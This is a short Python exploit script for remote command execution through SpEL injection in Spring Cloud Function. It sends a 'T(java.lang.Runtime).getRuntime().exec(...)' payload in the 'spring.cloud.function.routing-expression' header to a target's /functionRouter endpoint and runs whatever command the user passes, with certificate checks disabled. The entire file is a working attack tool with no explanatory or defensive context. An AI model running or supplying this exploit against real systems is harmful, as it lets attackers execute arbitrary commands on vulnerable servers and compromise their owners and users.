#!/usr/bin/python3

import requests
import sys

def init():

    if len(sys.argv) != 3:
        print("[!]Required more arguments")
        print("[-]Usage:")
        print(f"{sys.argv[0]} <URL> <Command>")
        print("[*]Example:")
        print(f"{sys.argv[0]} http://example.com/functionRouter \"whoami\"")
        sys.exit()

def argument_parse():

    url = sys.argv[1]
    cmd = sys.argv[2]
    
    #print(url)
    #print(cmd)
    
    return url,cmd

def exec_request(url,cmd):

    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    url = url + path

    try:
        req=requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
    
    except:
        print("[!]Some issue occured...")
        sys.exit()

def main():
    init()
    url,cmd = argument_parse()
    exec_request(url,cmd)

if __name__ == "__main__":

    main()

